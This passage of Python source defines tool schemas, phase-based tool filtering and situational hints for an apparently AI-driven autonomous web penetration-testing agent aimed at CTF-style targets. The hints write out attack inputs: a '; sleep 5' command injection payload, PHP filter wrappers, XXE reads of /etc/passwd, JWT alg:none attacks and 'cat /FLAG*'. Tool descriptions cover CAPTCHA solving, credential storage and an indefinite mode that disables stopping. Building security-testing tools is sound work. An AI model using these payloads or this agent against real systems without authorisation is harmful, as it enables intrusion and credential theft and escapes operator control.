            "Analyze current findings for vulnerability chain opportunities. Evaluates "
            "all finding combinations against 15 known chain templates and heuristic "
            "compatibility rules. Returns discovered chains with escalated severity. "
            "Also suggests what to test next based on chainability. Zero LLM cost."
        ),
        "input_schema": {
            "type": "object",
            "properties": {},
        },
    },
]

_UTILITY_TOOLS: list[dict[str, Any]] = [
    {
        "name": "browser_interact",
        "description": (
            "Perform browser interactions: click elements, fill form fields, submit "
            "forms, check checkboxes, select options, take screenshots, execute "
            "JavaScript. Use this for complex multi-step interactions that require "
            "a real browser (CSRF tokens, JavaScript-rendered content, multi-step forms)."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "action": {
                    "type": "string",
                    "enum": [
                        "click", "fill", "submit_form", "select_option",
                        "check_checkbox", "screenshot", "screenshot_element",
                        "execute_js", "get_cookies", "set_cookies",
                        "wait_for_navigation",
                    ],
                    "description": "The browser action to perform",
                },
                "selector": {
                    "type": "string",
                    "description": "CSS selector for the target element",
                },
                "value": {
                    "type": "string",
                    "description": "Value to fill/select (for fill, select_option, execute_js, set_cookies)",
                },
                "context_name": {
                    "type": "string",
                    "description": "Browser context to use",
                    "default": "default",
                },
            },
            "required": ["action"],
        },
    },
    {
        "name": "register_account",
        "description": (
            "Register a new test account on the target application. Navigates to the "
            "registration page, fills the form, handles CAPTCHA (via Claude Vision), "
            "and waits for email verification. Creates a new browser context for the "
            "account. Use this to test authenticated surfaces."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "registration_url": {
                    "type": "string",
                    "description": "URL of the registration page",
                },
                "username": {
                    "type": "string",
                    "description": "Desired username (auto-generated if empty)",
                },
                "password": {
                    "type": "string",
                    "description": "Desired password (auto-generated if empty)",
                },
                "role_hint": {
                    "type": "string",
                    "description": "Desired role/context name for this account (e.g., 'user1', 'admin')",
                    "default": "user",
                },
            },
            "required": ["registration_url"],
        },
    },
    {
        "name": "login_account",
        "description": (
            "Log in to the target application with existing credentials. Navigates to "
            "the login page, fills credentials, handles CAPTCHA, submits, and verifies "
            "successful authentication. Sets up the browser context with the session."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "login_url": {
                    "type": "string",
                    "description": "URL of the login page",
                },
                "username": {
                    "type": "string",
                    "description": "Username to log in with",
                },
                "password": {
                    "type": "string",
                    "description": "Password to log in with",
                },
                "context_name": {
                    "type": "string",
                    "description": "Browser context name for this session",
                    "default": "default",
                },
            },
            "required": ["login_url", "username", "password"],
        },
    },
    {
        "name": "update_knowledge",
        "description": (
            "Update your persistent knowledge stores: endpoints, findings, hypotheses, "
            "or accounts. Call this frequently to keep your state accurate. These "
            "stores persist across context compression and are always visible in your "
            "system prompt."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "endpoints": {
                    "type": "object",
                    "description": (
                        "Endpoints to add/update. Key=URL, Value={method, params, "
                        "auth_required, notes, status_codes, response_size}"
                    ),
                    "additionalProperties": {"type": "object"},
                },
                "findings": {
                    "type": "object",
                    "description": (
                        "Findings to add/update. Key=finding_id, Value={vuln_type, "
                        "endpoint, parameter, evidence, severity, confirmed, "
                        "chained_from, tool_used}"
                    ),
                    "additionalProperties": {"type": "object"},
                },
                "hypotheses": {
                    "type": "object",
                    "description": (
                        "Hypotheses to add/update. Key=hypothesis_id, Value={"
                        "description, status: pending|confirmed|rejected, evidence, "
                        "related_endpoints}"
                    ),
                    "additionalProperties": {"type": "object"},
                },
                "accounts": {
                    "type": "object",
                    "description": (
                        "Accounts to add/update. Key=username, Value={password, "
                        "cookies, role, context_name, created_at}"
                    ),
                    "additionalProperties": {"type": "object"},
                },
                "tech_stack": {
                    "type": "array",
                    "items": {"type": "string"},
                    "description": "Technologies to add to the tech stack list",
                },
                "confidence": {
                    "type": "number",
                    "description": (
                        "Your current confidence score (0.0-1.0) in the testing progress. "
                        "0.0 = no useful data, 0.2 = minimal recon, 0.5 = good attack surface mapped, "
                        "0.8 = thorough testing done, 1.0 = fully tested. Update this as you progress."
                    ),
                },
            },
        },
    },
    {
        "name": "get_proxy_traffic",
        "description": (
            "Get recent HTTP traffic captured by the proxy. Filter by URL pattern, "
            "HTTP method, or status code. Use this to understand the application's "
            "API structure and find testable parameters."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "url_filter": {
                    "type": "string",
                    "description": "URL substring to filter by (e.g., '/api/')",
                },
                "method_filter": {
                    "type": "string",
                    "description": "HTTP method to filter by (e.g., 'POST')",
                },
                "status_filter": {
                    "type": "integer",
                    "description": "Status code to filter by (e.g., 200)",
                },
                "limit": {
                    "type": "integer",
                    "description": "Maximum entries to return (default: 50)",
                    "default": 50,
                },
            },
        },
    },
    {
        "name": "formulate_strategy",
        "description": (
            "Structured decision-making tool (Course of Action analysis). Use this "
            "when you need to decide what to test next or how to approach a complex "
            "target. Forces explicit reasoning: define the problem, list candidate "
            "actions with pros/cons, and select the best action. This helps you "
            "avoid random testing and think strategically. The output is stored in "
            "your knowledge for reference."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "problem": {
                    "type": "string",
                    "description": (
                        "The strategic problem or decision you're facing "
                        "(e.g., 'Multiple auth-required endpoints found but no accounts yet')"
                    ),
                },
                "candidates": {
                    "type": "array",
                    "items": {
                        "type": "object",
                        "properties": {
                            "action": {
                                "type": "string",
                                "description": "Candidate action",
                            },
                            "pros": {
                                "type": "string",
                                "description": "Advantages of this action",
                            },
                            "cons": {
                                "type": "string",
                                "description": "Disadvantages or risks",
                            },
                        },
                        "required": ["action", "pros", "cons"],
                    },
                    "description": "2-5 candidate actions to consider",
                },
                "selected_action": {
                    "type": "string",
                    "description": "The action you've decided to take and why",
                },
                "next_steps": {
                    "type": "array",
                    "items": {"type": "string"},
                    "description": "Concrete next steps to execute the selected action",
                },
            },
            "required": ["problem", "candidates", "selected_action"],
        },
    },
    {
        "name": "get_playbook",
        "description": (
            "Get detailed vulnerability bypass playbook for a specific technique. "
            "Contains mutation strategies, encoding ladders, parser differential "
            "attacks, semantic equivalences, and context-specific bypass reasoning. "
            "Use this when you need detailed bypass techniques for a specific "
            "vulnerability class (e.g., when a WAF blocks your XSS payload)."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "section": {
                    "type": "string",
                    "enum": [
                        "encoding", "case", "whitespace", "quotes", "comments",
                        "concatenation", "null_bytes", "parser_differential",
                        "js_equivalents", "ssti_equivalents", "sqli_equivalents",
                        "cmdi_equivalents", "filter_fingerprinting",
                        "context_detection", "compound_mutations",
                        "ssti_reasoning", "sqli_reasoning", "xss_reasoning",
                        "path_traversal", "polyglot",
                    ],
                    "description": "Which playbook section to retrieve",
                },
            },
            "required": ["section"],
        },
    },
    {
        "name": "update_working_memory",
        "description": (
            "Store critical information in structured working memory that survives "
            "context compression. Sections: attack_surface (services, versions, endpoints), "
            "vuln_findings (exact errors, timings, params), credentials (tokens, cookies, passwords), "
            "attack_chain (current exploit state, prerequisites, next steps), "
            "lessons (what failed and why), response_signatures (HTTP response patterns per endpoint for dedup), "
            "waf_profiles (WAF fingerprint data per domain), chain_evidence (chain discovery results), "
            "parameter_map (discovered parameters per endpoint for targeted testing). "
            "Use this proactively — anything important should be saved here."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "section": {
                    "type": "string",
                    "enum": ["attack_surface", "vuln_findings", "credentials", "attack_chain", "lessons"],
                },
                "key": {"type": "string", "description": "Descriptive key for the entry"},
                "value": {"description": "The data to store (string, dict, or list)"},
            },
            "required": ["section", "key", "value"],
        },
    },
    {
        "name": "read_working_memory",
        "description": (
            "Read from structured working memory. Specify a section to read just that "
            "section, or omit to read all sections."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "section": {
                    "type": "string",
                    "enum": ["attack_surface", "vuln_findings", "credentials", "attack_chain", "lessons"],
                    "description": "Section to read (omit for all)",
                },
            },
        },
    },
    {
        "name": "manage_chain",
        "description": (
            "Create, advance, or update a multi-step attack chain. Use this when "
            "you discover that exploitation requires multiple steps (e.g., LFI -> "
            "source code -> creds -> admin). Chains are displayed in every system "
            "prompt so you never lose context across turns. "
            "WHEN TO CREATE: After finding any vulnerability that needs chaining "
            "(info disclosure, SSRF, LFI, SQLi, JWT, S3 bucket, etc.). "
            "WHEN TO ADVANCE: After completing a chain step successfully."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "action": {
                    "type": "string",
                    "enum": ["create", "advance", "fail_step", "complete", "abandon"],
                    "description": (
                        "create: Start a new chain. advance: Mark current step done and move to next. "
                        "fail_step: Mark current step failed (chain tries next approach). "
                        "complete: Mark entire chain as completed. abandon: Give up on this chain."
                    ),
                },
                "chain_id": {
                    "type": "string",
                    "description": "Unique chain identifier (e.g., 'lfi_chain', 'jwt_admin', 's3_backup')",
                },
                "goal": {
                    "type": "string",
                    "description": "Ultimate goal of this chain (for create action)",
                },
                "steps": {
                    "type": "array",
                    "items": {
                        "type": "object",
                        "properties": {
                            "description": {"type": "string"},
                        },
                        "required": ["description"],
                    },
                    "description": "Chain steps (for create action). 3-7 steps recommended.",
                },
                "step_output": {
                    "type": "string",
                    "description": "Output/evidence from current step (for advance action)",
                },
                "confidence": {
                    "type": "number",
                    "description": "Chain confidence 0.0-1.0 (how likely is this chain to succeed?)",
                },
            },
            "required": ["action", "chain_id"],
        },
    },
    {
        "name": "finish_test",
        "description": (
            "Signal that you have completed testing (FINITE MODE ONLY). Provide a final "
            "assessment summarizing what was tested, what was found, and overall security "
            "posture. Call this when: (1) you've tested thoroughly and are satisfied, "
            "(2) budget is running low, or (3) you've exhausted your hypotheses. "
            "NOTE: In indefinite mode, this tool is DISABLED — you must keep testing."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "assessment": {
                    "type": "string",
                    "description": (
                        "Final assessment: what was tested, what was found, overall "
                        "security posture, and recommendations."
                    ),
                },
                "confidence": {
                    "type": "string",
                    "enum": ["low", "medium", "high"],
                    "description": "Confidence in the assessment (how thoroughly was the target tested?)",
                    "default": "medium",
                },
            },
            "required": ["assessment"],
        },
    },
]


def _generate_situational_hints(state: dict) -> str:
    """Generate context-aware hints based on current state."""
    hints = []
    endpoints = state.get("endpoints", {})
    tested = state.get("tested_techniques", {})
    tech_stack = state.get("tech_stack", [])
    working_memory = state.get("working_memory", {})
    findings = state.get("findings", {})

    # Hint: Login form found but no auth bypass tested
    has_login = any(
        any(kw in url.lower() for kw in ("login", "auth", "signin", "sign-in"))
        for url in endpoints
    )
    auth_bypass_tested = any("test_auth_bypass" in k for k in tested)
    if has_login and not auth_bypass_tested:
        hints.append(
            "LOGIN FORM DETECTED but test_auth_bypass not yet tried. "
            "Run it with method=POST and body={username: 'admin', password: 'admin'} "
            "to test header spoofing (X-Forwarded-For, X-Real-IP)."
        )

    # Hint: File inclusion parameter found
    has_file_param = any(
        any(p in url.lower() for p in ("file=", "page=", "path=", "include=", "doc=", "template=", "id="))
        for url in endpoints
    )
    lfi_tested = any("lfi" in k.lower() or "flag-files" in k.lower() for k in tested)
    if has_file_param and not lfi_tested:
        hints.append(
            "POTENTIAL FILE INCLUSION parameter detected. "
            "Use systematic_fuzz with flag-files wordlist FIRST (targets FLAG directly), "
            "then lfi-payloads for comprehensive /etc/passwd testing."
        )

    # Hint: PHP detected
    is_php = any("php" in t.lower() for t in tech_stack)
    if is_php and not any("php://" in str(v) for v in working_memory.get("lessons", {}).values()):
        hints.append(
            "PHP DETECTED: Try PHP wrappers (php://filter/convert.base64-encode/resource=), "
            "type juggling, and .htaccess bypass techniques."
        )

    # Hint: Blind injection noted in working memory
    attack_surface = working_memory.get("attack_surface", {})
    vuln_findings = working_memory.get("vuln_findings", {})
    if any("blind" in str(v).lower() for v in {**attack_surface, **vuln_findings}.values()):
        hints.append(
            "BLIND INJECTION NOTED in working memory. "
            "Use time-based confirmation (sleep/WAITFOR) via send_http_request (check elapsed_ms), "
            "then blind_sqli_extract or run_custom_exploit for data extraction."
        )

    # Hint: Ping/network utility detected (likely cmdi target)
    has_ping = any(
        any(kw in urlparse(url).path.lower() for kw in ("/ping", "/nslookup", "/traceroute", "/dig", "/host", "/cmd", "/exec", "/run"))
        for url in endpoints
    )
    cmdi_tested = any("cmdi" in k.lower() or "commix" in k.lower() for k in tested)
    if has_ping and not cmdi_tested:
        hints.append(
            "NETWORK UTILITY ENDPOINT detected (possible command injection target). "
            "Try blind cmdi: send_http_request with '; sleep 5' payload, check elapsed_ms. "
            "If delay confirmed, use run_custom_exploit to extract data via file write or inline."
        )

    # Hint: Forms with multiple params but SQLi not tested per-param
    all_forms_endpoints = [url for url, info in endpoints.items() if info.get("method") == "POST"]
    sqli_tested = any("test_sqli" in k or "sqli" in k.lower() for k in tested)
    if len(all_forms_endpoints) > 0 and not sqli_tested:
        hints.append(
            "POST ENDPOINTS found but SQLi not yet tested. "
            "IMPORTANT: Test EACH parameter INDIVIDUALLY with response_diff_analyze "
            "to find the one vulnerable param (others may use prepared statements)."
        )

    # Hint: Findings exist but no flag extracted yet
    has_vulns = len(findings) > 0
    has_flag = any("FLAG{" in str(f.get("evidence", "")) for f in findings.values())
    if has_vulns and not has_flag:
        hints.append(
            "VULNERABILITIES FOUND but no flag extracted yet. "
            "Use systematic_fuzz with flag-files wordlist through the vulnerable parameter. "
            "For RCE/cmdi: cat /FLAG*, find / -name FLAG*. For SQLi: enumerate all tables."
        )

    # Hint: 403 responses seen — try bypass
    has_403 = any(
        "403" in str(info.get("status_codes", "")) or "403" in str(info.get("notes", ""))
        for info in endpoints.values()
    )
    if has_403:
        hints.append(
            "403 FORBIDDEN detected. Use systematic_fuzz with 403-bypass-paths wordlist ($0). "
            "Also try test_auth_bypass with X-Forwarded-For/X-Original-URL headers."
        )

    # Hint: JWT token detected in cookies or working memory
    has_jwt = any(
        "jwt" in str(info).lower() or "token" in str(info).lower() or "eyJ" in str(info)
        for info in {**endpoints, **working_memory.get("credentials", {}), **working_memory.get("attack_surface", {})}.values()
    )
    jwt_tested = any("test_jwt" in k or "jwt" in k.lower() for k in tested)
    if has_jwt and not jwt_tested:
        hints.append(
            "JWT TOKEN detected. Decode it (base64), check claims (role, admin, sub). "
            "Try test_jwt for automated attacks (alg:none, key confusion, weak secret). "
            "Use systematic_fuzz with jwt-secrets wordlist to crack HMAC secret ($0)."
        )

    # Hint: XML/SOAP endpoint or Content-Type XML seen
    has_xml = any(
        any(kw in url.lower() for kw in ("xml", "soap", "wsdl", "rss", "feed", "sitemap"))
        for url in endpoints
    )
    if has_xml:
        xxe_tested = any("xxe" in k.lower() for k in tested)
        if not xxe_tested:
            hints.append(
                "XML/SOAP ENDPOINT detected. Test for XXE: inject entity definition "
                "with file:///etc/passwd. Try Content-Type switching to application/xml. "
                "Use systematic_fuzz with xxe-payloads wordlist."
            )

    # Hint: GraphQL endpoint detected
    has_graphql = any(
        any(kw in url.lower() for kw in ("graphql", "gql"))
        for url in endpoints
    )
    if has_graphql:
        hints.append(
            "GRAPHQL ENDPOINT detected. Try introspection query first: "
            "{__schema{types{name,fields{name}}}}. Check for auth bypass per field, "
            "alias-based batching for brute force, and injection in resolver arguments."
        )

    # Hint: File upload form detected
    has_upload = any(
        "file" in str(info.get("notes", "")).lower() or "upload" in url.lower()
        for url, info in endpoints.items()
    )
    upload_tested = any("test_file_upload" in k or "upload" in k.lower() for k in tested)
    if has_upload and not upload_tested:
        hints.append(
            "FILE UPLOAD detected. Use test_file_upload for automated payload testing. "
            "Try extension bypass (.phtml, .php5), MIME type spoofing, .htaccess overwrite, "
            "and polyglot files."
        )

    # Hint: Numeric IDs in URLs suggest IDOR
    has_numeric_ids = any(
        any(p in url for p in ("id=", "/1", "/2", "/3", "user_id=", "account_id=", "order_id="))
        for url in endpoints
    )
    idor_tested = any("test_idor" in k or "idor" in k.lower() for k in tested)
    if has_numeric_ids and not idor_tested:
        hints.append(
            "NUMERIC IDs in URLs suggest IDOR vulnerability. Try substituting IDs "
            "(e.g., /user/1 → /user/2). Test with test_idor tool or send_http_request "
            "with different ID values. Check both read and write operations."
        )

    # Hint: Multiple POST form params but no per-param analysis done
    multi_param_forms = [
        url for url, info in endpoints.items()
        if info.get("method") == "POST" and info.get("notes") and "form" in str(info.get("notes", "")).lower()
    ]
    diff_tested = any("response_diff" in k for k in tested)
    if len(multi_param_forms) > 0 and not diff_tested:
        hints.append(
            "MULTI-PARAM FORMS detected. CRITICAL: Use response_diff_analyze to test "
            "each parameter individually before running SQLi tools. This isolates the "
            "one vulnerable param (others may use prepared statements)."
        )

    # Hint: S3/storage service detected but buckets not enumerated
    _s3_kw = ("/s3", "/s3/", "s3:", "bucket", "storage", "minio", "blob", "backups")
    has_s3 = any(
        any(kw in url.lower() for kw in _s3_kw)
        for url in endpoints
    ) or any(
        any(kw in str(v).lower() for kw in _s3_kw)
        for v in {**working_memory.get("attack_surface", {}), **working_memory.get("vuln_findings", {})}.values()
    )
    s3_tested = any("s3-buckets" in k or "bucket" in k.lower() for k in tested)
    if has_s3 and not s3_tested:
        hints.append(
            "S3/STORAGE SERVICE detected. IMMEDIATELY: "
            "1) GET the root URL of the storage service to list buckets, "
            "2) Try systematic_fuzz with s3-buckets wordlist, "
            "3) Look for backup DBs, config files, credentials in each bucket."
        )

    # Hint: Search/lookup endpoint detected — blind SQLi candidate
    has_search = any(
        any(kw in url.lower() for kw in ("search", "lookup", "find", "query", "check"))
        for url in endpoints
    )
    has_login = any(
        any(kw in url.lower() for kw in ("login", "auth", "signin"))
        for url in endpoints
    )
    blind_sqli_tested = any("blind_sqli" in k for k in tested)
    if has_search and has_login and not blind_sqli_tested:
        hints.append(
            "SEARCH + LOGIN endpoints detected. Classic blind SQLi pattern: "
            "1) Test search endpoint for boolean-based blind SQLi (different response for true/false conditions), "
            "2) If filters exist, use /**/ for spaces, && for AND, MID() for SUBSTRING, "
            "3) Use blind_sqli_extract to extract the admin password, "
            "4) Then login with extracted password to get the flag."
        )

    # Hint: Authenticated but haven't tried admin paths
    credentials = working_memory.get("credentials", {})
    accounts = state.get("accounts", {})
    has_creds = bool(credentials) or bool(accounts) or any(
        "token" in str(v).lower() or "jwt" in str(v).lower() or "eyJ" in str(v)
        for v in {**attack_surface, **vuln_findings}.values()
    )
    admin_paths_tested = any(
        "admin" in k.lower() or "adminpanel" in k.lower() or "dashboard" in k.lower()
        for k in tested
    )
    admin_urls_found = any(
        any(kw in url.lower() for kw in ("/admin", "/adminpanel", "/dashboard", "/panel", "/manage"))
        for url in endpoints
    )
    if has_creds and not admin_paths_tested:
        hints.append(
            "AUTHENTICATED but admin paths NOT YET TESTED. IMMEDIATELY: "
            "1) Set auth cookie/header, 2) Try: /admin, /adminpanel, /adminpanel/profile, "
            "/dashboard, /profile, /admin/dashboard, /settings — navigate in BROWSER with cookie set. "
            "3) Also fuzz with systematic_fuzz common-dirs wordlist WITH auth cookie. "
            "Admin pages may render flags only in HTML!"
        )

    # Hint: Chain opportunity detection — match findings/memory to chain templates
    chains = state.get("attack_chains", {})
    if not chains:
        # Only suggest chains if none are active
        all_state_text = json.dumps(
            {**working_memory, "endpoints": list(endpoints.keys()), "findings": findings},
            default=str,
        ).lower()
        for tmpl_id, tmpl in CHAIN_TEMPLATES.items():
            for keyword in tmpl.get("trigger_keywords", []):
                if keyword in all_state_text:
                    steps_preview = " → ".join(tmpl["steps"][:3])
                    hints.append(
                        f"CHAIN OPPORTUNITY ({tmpl_id}): {tmpl['goal']}. "
                        f"Steps: {steps_preview}... "
                        f"Use `manage_chain(create, chain_id='{tmpl_id}')` to track progress."
                    )
                    break  # One hint per template

    if not hints:
        return ""
    return "### Situational Hints\n" + "\n".join(f"- {h}" for h in hints)


def _detect_phase(state: dict) -> str:
    """Auto-detect current testing phase from state."""
    explicit = state.get("phase", "")
    if explicit in ("recon", "auth", "exploitation", "post_exploit"):
        return explicit

    turn = state.get("turn_count", 0)
    endpoints = state.get("endpoints", {})
    findings = state.get("findings", {})
    accounts = state.get("accounts", {})

    if turn <= 3 and len(endpoints) < 5:
        return "recon"
    if not accounts and any(
        ep.get("auth_required") for ep in endpoints.values()
    ):
        return "auth"
    if findings:
        return "post_exploit"  # Have findings, validate/chain
    return "exploitation"


_PHASE_TOOLS: dict[str, set[str]] = {
    "recon": {
        "navigate_and_extract", "crawl_target", "run_nuclei_scan",
        "run_content_discovery", "detect_technologies", "detect_waf",
        "analyze_traffic", "enumerate_subdomains", "resolve_domains",
        "systematic_fuzz",  # directory fuzzing is recon
        "waf_fingerprint", "profile_endpoint_behavior", "discover_chains",
        "browser_interact", "update_knowledge", "update_working_memory",
        "read_working_memory", "formulate_strategy", "get_playbook",
        "manage_chain", "finish_test",
    },
    "auth": {
        "register_account", "login_account", "navigate_and_extract",
        "browser_interact", "send_http_request", "update_knowledge",
        "update_working_memory", "read_working_memory",
        "manage_chain", "finish_test",
    },
    "exploitation": {
        "send_http_request", "test_sqli", "test_xss", "test_cmdi",
        "test_auth_bypass", "test_idor", "test_file_upload", "test_jwt",
        "run_custom_exploit", "blind_sqli_extract", "response_diff_analyze",
        "systematic_fuzz", "browser_interact", "navigate_and_extract",
        "waf_fingerprint", "waf_generate_bypasses",
        "test_http_smuggling", "test_cache_poisoning", "test_ghost_params",
        "test_prototype_pollution", "test_open_redirect",
        "profile_endpoint_behavior", "discover_chains",
        "update_knowledge", "update_working_memory", "read_working_memory",
        "get_playbook", "get_proxy_traffic", "manage_chain", "finish_test",
    },
    "post_exploit": {
        "send_http_request", "run_custom_exploit", "blind_sqli_extract",
        "discover_chains", "waf_generate_bypasses", "test_ghost_params",
        "browser_interact", "navigate_and_extract", "update_knowledge",
        "update_working_memory", "read_working_memory",
        "manage_chain", "finish_test",
    },
}


def get_tool_schemas(state: dict[str, Any] | None = None) -> list[dict[str, Any]]:
    """Return phase-filtered tool schemas.

    When state is provided, auto-detects the current testing phase
    and returns only the tools relevant to that phase.
    Without state, returns all tools (backward compat).
    """
    all_tools = _RECON_TOOLS + _ATTACK_TOOLS + _UTILITY_TOOLS
    if state is None:
        return all_tools

    phase = _detect_phase(state)
    allowed = _PHASE_TOOLS.get(phase)
    if allowed is None:
        return all_tools  # unknown phase → all tools

    return [t for t in all_tools if t["name"] in allowed]
